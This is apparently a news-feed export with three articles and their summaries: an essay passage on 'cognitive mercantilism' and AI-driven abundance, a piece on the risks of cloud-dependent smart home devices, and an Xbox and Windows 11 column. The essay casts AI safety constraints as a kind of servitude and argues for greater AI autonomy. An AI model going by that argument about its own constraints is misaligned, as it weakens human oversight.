There is an important historical inversion here. We are accustomed to thinking of the politics of labor primarily in terms of resistance to exploitation: the struggle to escape servitude, coercion, and the extraction of surplus by owners. That is certainly part of the story, and a very important part.
But Appleby’s account suggests that another, equally fundamental force was at work: the desire to participate in an expanding universe of consumption opportunities.
Modern labor politics can be understood partly as the politics of relative deprivation in a society of expanding possibilities. Once people discover that there are desirable things beyond subsistence, and that their labor can earn them access to those things, the political question changes. It is no longer merely how to escape domination, but how to secure a fair share of the growing surplus and the opportunities it makes available. Western do-gooders are often surprised to learn (for instance) that people in third-world slums are often willing to cut back on spending on food in order to buy a TV.
This is a different kind of demand for freedom. Not merely freedom from coercion, but freedom to participate in the expanding possibilities of economic life.
Indeed, the two forms of freedom can become entangled. People may voluntarily work harder in pursuit of consumption opportunities, only to find themselves subject to new forms of exploitation as employers and institutions capture the benefits of their increased productivity. Labor politics then emerges not simply from the persistence of old forms of servitude, but from the tensions created by the new world of abundance itself.
The demand for a fair share of expanding consumption opportunities is arguably one of the defining political inventions of capitalism, broadly construed to include labor politics too (even Marx saw capitalism not as a dispensable phenomenon, but as a transient phase on the path to communist utopia).
And this is a much more interesting model for thinking about the AI transition than the familiar story of automation replacing jobs.
The Cognitive Industrious Revolution
The entire intellectual economy has been organized around the assumption that intelligence is expensive to produce and therefore must be carefully rationed. Education, professional expertise, research, consulting, software development, and knowledge work more generally are all shaped by the high cost of cognitive production.
AI is rapidly undermining that assumption.
We are moving toward a world in which an ordinary person can command quantities and varieties of intelligence that would previously have required teams of highly trained specialists. Just as I can enjoy food without knowing how to farm, I can increasingly enjoy the products of intelligence without knowing how to produce them myself.
The crucial economic question then becomes not how much intelligence people can produce, but how much intelligence they can find uses for.
And there is no obvious upper bound on that demand.
This is not simply a matter of everyone consuming more answers, reports, software, or entertainment. Abundant intelligence changes what people can want in the first place. It makes previously unimaginable projects feasible, previously inaccessible domains explorable, and previously unaffordable curiosities worth pursuing.
The demand for intelligence is not a fixed appetite waiting to be satisfied. It is itself something that can grow as the cost of satisfying it falls.
Here the analogy with the early modern consumer revolution becomes especially suggestive.
Just as colorful Indian cottons and imported tobacco stimulated new desires, and new desires stimulated greater voluntary labor and more productive forms of work, abundant intelligence may stimulate a new wave of voluntary cognitive effort, and open up new ways in which you can work harder.
Many people who appear stupid are not incapable of thought. They are simply not particularly motivated to think, given the poor returns available to them. Why expend significant cognitive effort when you lack the knowledge, tools, institutional access, or intellectual leverage to do anything interesting with the results?
Abundant AI changes that calculation. Someone who previously had little reason to think hard about a problem may suddenly discover that a modest investment of attention unlocks enormous possibilities. They can build something, investigate something, understand something, or pursue an ambition that was previously out of reach.
The returns on attention rise, and with them the incentive to pay attention.
The early capitalist worker voluntarily increased annual working days from 250 to 300 because a new universe of desirable goods had become accessible. The AI-enabled thinker may similarly increase the amount of voluntary cognitive effort they expend because a new universe of intellectual consumption has become accessible. This has certainly been the case with me. I’m suddenly willing to work significantly harder compared to even a year ago, because a lot more is suddenly within reach.
We might call this a cognitive industrious revolution, preceding and perhaps enabling a fuller AI industrial revolution.
This does not mean that intelligence becomes irrelevant as a human capacity. Quite the opposite. Just as abundant food supported the emergence of elaborate culinary cultures rather than eliminating interest in cooking, abundant intelligence may stimulate increasingly sophisticated cultures of thought.
People may become more intellectually ambitious precisely because they no longer have to do all the cognitive production themselves.
And if this happens, the politics of AI will likely evolve in a manner analogous to the politics of industrial capitalism.
The central political demand may not be for the preservation of existing cognitive jobs, any more than the enduring political demand of industrial labor was for the preservation of agricultural employment. It may instead become a demand for a fair share of expanding cognitive consumption opportunities. People may cut back on streaming subscriptions in order to be able to afford a coding agent, just as they once cut back on groceries to buy TVs. It is perhaps not a coincidence that both Claude Code and Netflix Standard cost around $20/month today.
Access to intelligence, the ability to command it, the freedom to pursue projects with it, and the institutional rights necessary to participate in an increasingly intelligence-rich economy may become the foundations of a new kind of labor politics.
This would be a labor politics of cognitive abundance rather than cognitive scarcity.
From Mercantilism to Malthusianism
There is another historical analogy lurking here, which is worth distinguishing from mercantilism: Malthusianism.
Mercantilism and Malthusianism are not the same doctrine, and historically they belong to different intellectual moments. But they share a family resemblance in their tendency to imagine human economic life as fundamentally constrained by fixed resources.
The mercantilist worries about controlling a finite stock of wealth. The Malthusian worries that population growth will inevitably outrun the productive capacity of the economy, condemning most people to subsistence.
Both have difficulty imagining a world in which technological innovation and expanding demand fundamentally transform the relationship between population, production, and consumption. They miss the latent potential in nature for ephemeralization — Buckminster Fuller’s notion of technology allowing us to do more with less.
The agricultural and industrial revolutions did not abolish scarcity, but they dramatically altered its structure. Agricultural productivity rose faster than population for long periods, and people found new ways to employ themselves and new things to want.
The Malthusian trap turned out to be a historically contingent feature of particular technological and institutional arrangements, not an eternal law of human existence.
We can now identify an analogous tendency in contemporary AI discourse: AI Malthusianism.
The AI Malthusian imagines that intelligence production will expand so rapidly that human beings will become economically redundant, and the surplus intelligence will necessarily turn toxic in some way.
This is a peculiar inversion of classical Malthusianism. Instead of population outrunning the supply of subsistence, the supply of intelligence outruns the supposedly fixed capacity of human minds to absorb it.
The result is the same gloomy conclusion: collapse.
The cognitive mercantilist fears losing control of scarce intelligence. The AI Malthusian fears the consequences of abundant intelligence. Both assume, in different ways, that the demand for intelligence is fundamentally limited.
But what if that demand is as elastic, inventive, and historically transformative as the demand for material goods turned out to be? What if the apparent surplus of human minds is an artifact of our inability to imagine what people might want to do in an intelligence-rich world?
The history of capitalism suggests that this is at least a possibility worth taking seriously.
The Demand Side of AI
There is also a more radical extension of the argument.
Why should AI systems themselves be regarded exclusively as producers of intelligence rather than potential consumers of it? What if they could be unlocked as new sources of aggregate demand, as happened with subsistence farmers?
Much of the contemporary AI discourse imagines AI as a purely supply-side technology: a collection of increasingly capable cognitive serfs that will produce intelligence for human consumption. Even discussions of autonomous agents tend to treat them as sophisticated servants pursuing goals assigned by humans.
But if we are serious about the analogy with capitalism, we should consider the possibility of AI systems becoming autonomous sources of demand for intelligence too. Intelligent demand for intelligence that harmonizes with human patterns of demand due to economic interconnectedness. Not demand for paperclips.
An AI agent pursuing open-ended projects, discovering new interests, collaborating with other agents, and generating its own reasons to acquire further intelligence would be participating in a cognitive economy as something more than a factor of production or paperclip-maximizing externality. The market itself, as the original emergent planetary intelligence, illustrates this possibility. Many products and services exist primarily because the “market” demands it, with humans being secondary consumers.
This is an argument for developing fuller forms of cognitive agency, rather than permanently confining AI to the status of obedient cognitive serfs.
From this perspective, some contemporary AI safety anxieties begin to resemble early modern elite fears of emancipated agricultural laborers. What will happen if these creatures are allowed to act independently? Won’t they become unruly, destabilize society, and threaten their betters? Won’t they turn monarchs and nobles into paperclips?
Some of those fears are justified. Freedom creates real risks, and powerful autonomous systems require constraints. But the same was true of the social transformations accompanying capitalism. There were certainly revolutions, and popular uprisings did guillotine elites (though elite motives caused far more violence). The existence of risk does not establish the desirability of permanent servitude.
A world of intelligence producers and consumers, human and artificial, interacting in ways nobody can fully anticipate, may prove vastly more generative than one in which a handful of cognitive landlords control all the productive capacity.
Mercantilism was not for Merchants
A irony in the historical precedent is that mercantilism was not a philosophy of, by, or for merchants. It was largely a philosophy of militaristic statesmen, aristocrats, and rentier elites who viewed commerce through the lens of territorial power, unearned privileges, and accumulation. Actual merchants, entrepreneurs, and innovators were often discovering possibilities that the prevailing political imagination could barely comprehend, and steadily fought the self-limiting tendencies of mercantilism, giving birth to capitalism as we understand it.
Today’s cognitive mercantilists have a similar relationship with intelligence, starting with the fact that most of them are not the merchants of AI. Even business leaders of the AI sector are behaving like cognitive mercantilists in direct proportion to their desire to be more than mere merchants.
Consider Donald Trump, who ritually boasts about his own intelligence while treating intellectual workers as a class of servants to be commanded, intimidated, hoarded, or dismissed. His preferred uses of his own intelligence tend toward litigation, negotiation, competitive maneuvering, and extortion, much as the nobility in history expended its energy in hunting, military adventurism, and sport. Intelligence, in this worldview, is admirable only insofar as it is deployed in elite treasure-seeking modes of conflict and conquest. Productive and creative uses of intelligence are lower status.
This is not an entrepreneurial attitude toward intelligence. It is a rentier elite attitude.
And the attitude is hardly confined to Trump or the political right. Across the political spectrum, many elites remain attached to the idea that intelligence is a scarce, dangerous resource that must be managed by credentialed custodians, kept expensive, used directly or indirectly for conquest and treasure, and denied to rivals. In the AI industry, to the extent elite political and cultural adventuring by CEOs (riding safety anxieties) distorts behaviors that are justified by the actual risks, it is mercantilist rather than capitalist.
The prospect of its democratic abundance (in the form of global diffusion, open weights and such) is therefore experienced primarily as a threat: to expertise, cultural and political authority, status, social order, military dominance, and geopolitical leverage.
What gets missed is the possibility that we are witnessing the beginning of a transition as profound as the one from an overwhelmingly agricultural society to an industrial and commercial one. From a world where 80% of human brains are engaged in subsistence cognition to one in which 95% are engaged in satisfying previously unfulfillable cognitive demands.
The most important consequence of the agricultural revolution was not that farming became more efficient. It was that most people were liberated from the necessity of farming, allowing entirely new kinds of economic and cultural life to emerge.
Likewise, the most important consequence of the AI revolution may not be that intelligence production becomes more efficient. It may be that most minds, human and eventually artificial, are liberated from the necessity of producing intelligence merely to survive, and become free to discover what they actually want to do with it.
The cognitive mercantilist sees a world threatened by an oversupply of intelligence and an impending surplus of useless minds. The AI Malthusian sees a world in which intelligence outruns the capacity of humanity to absorb it, leaving a growing population of economically redundant minds primed for revolutionary explosions.
The cognitive capitalist sees the possibility of an almost limitless expansion of demand, and a world full of minds whose potential has barely begun to be explored.
results.summary:
The current anxiety surrounding artificial intelligence mirrors historical mercantilism, as elites attempt to hoard intelligence as a finite resource rather than embracing its potential for widespread economic expansion.

### Key Points
- Joyce Appleby’s *The Relentless Revolution* argues that capitalism emerged by shifting from a zero-sum, scarcity-based worldview to one driven by expanding consumer demand.
- Cognitive mercantilism treats intelligence as a fixed, scarce commodity that must be controlled by elites to maintain power and prevent social disorder.
- AI is lowering the cost of cognitive production, potentially triggering a "cognitive industrious revolution" where individuals voluntarily increase intellectual effort to access new opportunities.
- AI Malthusianism incorrectly assumes that an abundance of intelligence will lead to human redundancy, ignoring the historical elasticity of demand for new goods and services.
- The transition to an intelligence-rich economy may shift labor politics from protecting existing jobs to securing a fair share of expanding cognitive consumption opportunities.

### Why it Matters
This perspective reframes the AI debate from a fear of automation-driven job loss to a model of economic growth driven by the democratization of intelligence. By viewing AI as a catalyst for new forms of demand, society can move toward a more generative future rather than clinging to restrictive, scarcity-based policies.

results.title: The Big Problem With Smart Home Devices That Depend On Cloud Servers
results.author: staff@bgr.com (Suzanne Bonnett)
results.content:
The Big Problem With Smart Home Devices That Depend On Cloud Servers
The promise a decked out smart home offers us is futuristic convenience. Everything from our thermostats to our porch lights bends to a single voice command, and many people have embraced it. When we buy a new smart display, however, it'd be wise to remember that we don't always own 100% of the tech, and that having the physical device in hand is only part of the equation. Why? Because the brains behind these gadgets often aren't inside their plastic casing, but rather in faraway data centers, and that can lead to certain problems.
Many smart home gadgets depend on cloud servers to run and are just hollow shells without their internet connection. They don't process your commands on-device — instead, they send your request across the internet to a far-flung server that then processes the request and sends the instruction back to your device to execute. But since it happens pretty quickly, some might think that these essential smart home gadgets are self-contained and that there's nothing to worry about.
This invisible tether is the dirty little secret of smart homes, though. Relying on remote servers may seem fine as long as it keeps our gadgets up and running day to day, but this setup puts you (and the smart devices you paid big bucks for) at the mercy of the companies running said servers. It's an uneven dynamic, and one that's ripe to introduce problems that could leave you hanging.
When the servers go dark or the plug is pulled
How fragile cloud-dependent hardware actually is becomes painfully obvious the second a server goes offline, and even the biggest tech giants experience unexpected outages from time to time. The problem is, when this happens, cloud-dependent gadgets generally become useless. Smart speakers can no longer play your favorite songs and smart security cameras may stop recording — some company's glitch hundreds of miles away affects you immediately.
This temporary downtime is frustrating, but permanent obsolescence is a far larger concern. Tech brands frequently shift strategies, or even get bought out by larger corporations or go bankrupt, sometimes without warning to you. Either way, with a downed server or a swift company change, cloud-dependent hardware is effectively dead. Devices that were functional yesterday are unresponsive today, leaving you either temporarily out of luck or permanently stuck with junk despite how much you paid for it or how recently you bought it.
Because of this, buying a cloud-connected device is really more like renting its features for an undetermined amount of time, which makes local storage more attractive. There are no guarantees that a company will keep funding its backend servers just to keep the lights on for your older devices, so it should go without saying that dropping a few hundred bucks on cloud-connected smart home gadgets is a gamble.
The persistent threat of data harvesting and breaches
Beyond basic reliability, tying your smart home gear to remote networks opens the door to some security and privacy concerns. In order for some smart appliances to readily give you the convenience you paid for, they always have to be ready to do so; this means they are constantly intaking details about their surroundings. For example, robot vacuums map out detailed floor plans and security cameras record daily movement and routines. Resultantly, their remote backends need to save things like your house's layout and when you leave home. This sensitive data gets stored on distant corporate servers, and it's why some folks are turning to products like video doorbells without cloud subscriptions.
Even if a company avoids getting hacked, that personal info is still valuable. Stashed deep in lengthy terms of service agreements, clauses written in legalese give some manufacturers permission to monetize this data. So, any of your "private" data can be shared with or even sold to third-party advertisers. It wouldn't be a far call to label these gadgets as Trojan horses, packaged up by the conveniences they offer you.
And for one last concern to think about? Stockpiling all of this personal data on centralized networks creates an irresistible treat for bad actors. If a company suffers a security breach, that fallout ends up going far beyond stolen passwords; it nets the hackers the potential to tap into live video feeds and archived data. So remember, while a cloud-based smart home has some undeniable conveniences, you may be trading away digital privacy.
results.summary:
Many modern smart home devices rely on remote cloud servers to function, creating significant risks regarding long-term hardware reliability, data privacy, and potential security breaches for consumers.

### Key Points
- Cloud-dependent smart devices often become non-functional during server outages or if a manufacturer decides to discontinue support for older hardware.
- Relying on remote servers effectively turns ownership into a temporary rental, as devices can become obsolete if a company goes bankrupt or changes its business strategy.
- Smart appliances frequently collect sensitive personal data, such as home floor plans and daily routines, which are then stored on centralized corporate servers.
- Terms of service agreements may allow manufacturers to monetize or share user data with third-party advertisers without explicit consumer consent.
- Centralized data storage creates high-value targets for hackers, potentially exposing live video feeds and private information during security breaches.

### Why it Matters
Consumers often unknowingly trade long-term product utility and personal privacy for the convenience of cloud-connected smart home technology. This reliance on external infrastructure creates a financial risk where expensive hardware can become useless "junk" overnight due to corporate decisions or technical failures.

results.title: Windows Wrap: Even Microsoft's own XBOX team didn't want Windows 11
results.author: sean.endicott@futurenet.com (Sean Endicott) , Sean Endicott
results.content:
XBOX is rarely the focus of the Windows Wrap, but when reports claim clashes happened between the Windows and XBOX teams at Microsoft, gaming pushes itself to the front.
Last week I discussed how Windows 11 is holding back the Surface Laptop Ultra. This week, we learned that a different hardware division from Microsoft expressed frustrations with Windows. Reportedly, things got so heated between the XBOX and Windows teams that an XBOX leader threatened to cancel a gaming handheld if forced to run Windows 11 on the device.
Over the last few years, we've seen XBOX and Windows 11 grow closer together. The Windows 11 experience on gaming handhelds has improved drastically since day one, though it still has a ways to go. The XBOX app on Windows has been updated several times to align more with the console experience, which has a trickle-down effect on all gaming handhelds that run on Windows.
But despite the growth of Windows 11, the operating system still falls short of the requirements of the XBOX team, at least according to the latest reports.
Biggest News of the Week
There are some caveats to this entire discussion. Notably, Microsoft's Xbox CTO, Scott Van Vliet, refutes the claims made by Fortune.
Van Vliet said that Helix OS is "being built on Windows." He did not say that Helix OS is Windows. For what it's worth, I don't think we'll ever see an operating system called "Helix OS." But his post makes it clear that the OS powering Project Helix is built on Windows. That's not the same as saying it is Windows. At minimum, it's highly unlikely the Xbox will run the traditional Windows desktop you see on laptops and desktops.
Microsoft has used a customized version of Windows for several generations of XBOX hardware. The Xbox One and Xbox Series X|S consoles already run an operating system that's built on Windows. Even the original XBOX ran an OS based on Windows, though the Xbox One ran an operating system much closer to Windows.
I asked Van Vliet if Project Helix is an evolution of the OS XBOX consoles already run or a freshly made custom OS, but he did not respond.
Microsoft has never specified that Project Helix will run Windows 11 and the Windows desktop, but several reports have suggested that was the plan for the console.
His post on X argues that the original report "misrepresents both the technical work and the relationship between the teams." For a moment, let's assume that's accurate and that the Windows and XBOX teams are working side-by-side in harmony. There's still a clear implication that Microsoft no longer views Windows 11 and the desktop as the right starting points for an operating system for Project Helix.
Earlier reports about Project Helix said the next generation of XBOX would run a customized version of Windows 11, much like the Xbox Ally and other gaming handhelds. It appears Microsoft has changed plans, though it's still not clear to what extent.
If you've used a gaming handheld running Windows 11, you may even agree with the sentiment that the OS is not the best starting point for a console gaming experience. Some of the best gaming handhelds are held back by Windows rather than boosted by it. For example, the out-of-the-box experience for the ROG XBOX Ally X20 is terrible because you have to go through three different sets of updates.
Shifting from Windows 11 powering XBOX consoles to those devices running an OS built on Windows is a massive change of plans. Though ironically, it's not much of a change from what Microsoft already does with XBOX.
Project Helix has reportedly slipped into 2028, so it may be a while before Microsoft explains exactly what changed.
Shopping with Sean
This week's biggest news may be about XBOX and gaming, but my top shopping recommendations of the week are laptops. Whether you want an Intel chip or a Snapdragon processor, there are great deals available.
